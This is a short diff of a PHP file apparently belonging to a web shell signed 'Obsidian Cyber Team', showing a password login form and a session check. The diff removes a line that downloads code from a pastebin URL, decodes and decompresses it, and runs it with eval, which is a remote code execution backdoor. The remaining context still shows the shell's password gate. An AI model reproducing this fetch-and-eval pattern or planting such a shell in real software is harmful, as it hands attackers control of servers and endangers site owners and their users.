@@ -68,7 +68,6 @@ Obsidian Cyber Team
     <input type=password name=jancox> 
     </form></center> 
     <?php 
-	eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));
     exit; 
 } 
 if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
